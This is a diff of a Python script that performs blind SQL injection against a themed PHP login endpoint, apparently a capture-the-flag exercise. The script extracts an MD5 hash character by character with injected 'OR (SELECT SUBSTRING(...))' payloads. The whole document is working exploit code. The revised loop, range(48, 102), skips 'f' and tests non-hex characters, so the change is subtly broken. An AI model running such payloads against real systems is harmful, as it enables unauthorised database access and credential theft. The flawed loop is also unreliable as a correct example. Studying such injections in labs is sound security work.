@@ -76,15 +76,16 @@ URL = "http://lannister.castral-roc.lannisport.south/entourage_lannister.php"
 TRUE_RESPONSE = "L’utilisateur est un allié"
 MD5_HASH = ""
 
-for i in range(1, 33):  # Un hash MD5 fait 32 caractères hexadécimaux
-    for hex_code in "0123456789abcdef":  # Valeurs hexadécimales
-        payload = f"' OR (SELECT SUBSTRING(username, {i}, 1) FROM allies WHERE relation='espion' AND localisation='Winterfell') = '{hex_code}' -- "
+# Extraire caractère par caractère sans HEX()
+for i in range(1, 33):  # Un hash MD5 fait 32 caractères
+    for ascii_code in range(48, 102):  # 0-9, a-f (valeurs hexadécimales)
+        payload = f"' OR (SELECT SUBSTRING(username, {i}, 1) FROM allies WHERE relation='espion' AND localisation='Winterfell') = '{chr(ascii_code)}' -- "
         data = {"username": payload}
         response = requests.post(URL, data=data)
 
         if TRUE_RESPONSE in response.text:
-            MD5_HASH += hex_code
-            print(f"[+] Caractère {i} trouvé : {hex_code}")
+            MD5_HASH += chr(ascii_code)
+            print(f"[+] Caractère {i} trouvé : {chr(ascii_code)}")
             break
 
 print(f"\n🚀 Hash MD5 de l'espion : {MD5_HASH}")
